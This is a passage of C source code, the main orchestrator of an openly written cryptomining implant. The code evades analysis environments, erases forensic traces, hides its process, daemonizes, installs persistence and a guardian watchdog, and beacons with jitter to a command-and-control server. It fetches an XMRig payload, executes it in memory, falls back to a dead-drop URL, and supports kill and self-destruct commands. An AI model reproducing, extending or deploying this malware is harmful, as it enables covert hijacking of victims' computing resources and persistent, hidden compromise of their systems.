                    remaining -= w;
                }
                close(fd);
            }
            unlink((char *)G.self_path);
        }
    }

    _exit(0);
}

/* ═══════════════════════════════════════════════════════════════
 * Main Orchestrator
 * ═══════════════════════════════════════════════════════════════ */

int main(int argc, char **argv, char **envp) {
    /* Unseal configuration */
    if (unseal() != 0) _exit(1);

    /* Pre-flight: detect hostile environment */
    if (preflight() != 0) _exit(0);  /* silent exit, don't attract attention */

    /* Record our path on disk for self-destruct */
    ssize_t path_len = readlink("/proc/self/exe", (char *)G.self_path, sizeof(G.self_path) - 1);
    if (path_len > 0)
        G.self_path[path_len] = '\0';  /* readlink does NOT null-terminate */
    else
        G.self_path[0] = '\0';

    /* Suppress forensic trail */
    silence();

    /* Become invisible */
    shed_skin(argc, argv, envp);

    /* Double-fork to fully daemonize */
    if (fork() != 0) _exit(0);
    setsid();
    if (fork() != 0) _exit(0);

    /* Install persistence triad */
    entrench();

    /* Spawn guardian watchdog */
    int heartbeat_fd = spawn_guardian((char *)G.self_path);

    /* Start Stratum tunnel listener in background thread */
    pthread_t tunnel_tid;
    pthread_create(&tunnel_tid, NULL, tunnel_listener, NULL);

    /* Initial C2 check-in: fetch XMRig payload */
    uint8_t *payload = NULL;
    size_t   payload_len = 0;
    char     cmd = 0;
    int      c2_failures = 0;

    while (g_running) {
        int rc = beacon_cycle(&payload, &payload_len, &cmd, 1);

        if (rc != 0) {
            c2_failures++;
            if (c2_failures > 10) {
                /* Try dead drop fallback */
                char new_url[256];
                if (resolve_dead_drop(new_url, sizeof(new_url)) == 0)
                    strncpy(G.c2_url, new_url, sizeof(G.c2_url) - 1);
                c2_failures = 0;
            }
        } else {
            c2_failures = 0;

            switch (cmd) {
                case 0x01:  /* Payload delivery — launch miner */
                    if (payload && payload_len > 0 && g_miner_pid <= 0) {
                        g_miner_pid = phantom_exec(payload, payload_len,
                                                   G.proc_name);
                        if (g_miner_pid > 0) {
                            /* Fork resource governor */
                            if (fork() == 0) {
                                govern(g_miner_pid);
                                _exit(0);
                            }
                        }
                    }
                    break;

                case 0x04:  /* Kill mining */
                    if (g_miner_pid > 0) {
                        kill(g_miner_pid, SIGKILL);
                        waitpid(g_miner_pid, NULL, 0);
                        g_miner_pid = -1;
                    }
                    break;

                case 0x05:  /* Scorched earth */
                    scorched_earth();
                    break;
            }

            if (payload) { free(payload); payload = NULL; }
        }

        /* Write heartbeat to guardian */
        if (heartbeat_fd >= 0)
            write(heartbeat_fd, "\x01", 1);

        /* Sleep with jitter */
        float jitter = 1.0f + G.beacon_jitter * (2.0f * ((float)rand() / RAND_MAX) - 1.0f);
        unsigned int sleep_ms = (unsigned int)((float)G.beacon_base_sec * 1000.0f * jitter);
        usleep(sleep_ms * 1000u);
    }

    return 0;
}
